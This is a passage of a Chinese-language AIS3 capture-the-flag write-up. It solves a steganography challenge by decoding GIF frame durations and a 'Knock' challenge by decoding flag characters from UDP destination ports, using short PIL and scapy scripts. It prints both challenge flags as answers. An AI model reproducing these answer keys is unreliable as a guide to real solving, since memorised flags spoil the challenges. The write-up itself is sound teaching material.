im = Image.open('./gift_in_the_dream_updated.gif')
try:
    while 1:
        print(im.info['duration'])
        im.seek(im.tell()+1)
except EOFError:
    pass
```

<img width="800" alt="gift-in-the-dream-durations" src="https://user-images.githubusercontent.com/38059464/176882746-edc345bd-2ce1-4cbb-a0c3-4c33955ebbbd.png">

2. 可以發現 `duration / 10` 皆在 ASCII 範圍內，因此把 `duration / 10` 組合起來即為 flag。 

```python
from PIL import Image

# ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python

im = Image.open('./gift_in_the_dream_updated.gif')

flag = ''
try:
    while 1:
        flag += chr(im.info['duration'] // 10)
        im.seek(im.tell()+1)
except EOFError:
    pass

print(flag)
```

**Flag: `AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}`**

### Knock

1. 根據題目猜測 knock 應該是指 server 會嘗試透過網路戳參賽者的機器，因此用 Wireshark listen 在 VPN 的 interface，發現有一些多的 UDP 封包。

<img width="800" alt="knock-udp-packets" src="https://user-images.githubusercontent.com/38059464/176883739-82d28564-3957-4386-be14-5371673d6285.png">

2. 觀察發現 UDP packet 的 dest. port 最後兩位數都在 ASCII 範圍內，且前四個封包 `63 73 83 51` 便是 `AIS3`，因此拉出來即是 flag。這題感覺有點通靈，但其實是一種 exfiltration 的方法。

```python
import scapy.all as scapy

packets = scapy.rdpcap('./knock.pcapng')

knock_packets = packets[scapy.UDP][12:]

flag = ''
for p in knock_packets:
    flag += chr(p.dport - 12000)

print(flag)
```

**Flag: `AIS3{kn0ckKNOCKknock}`**





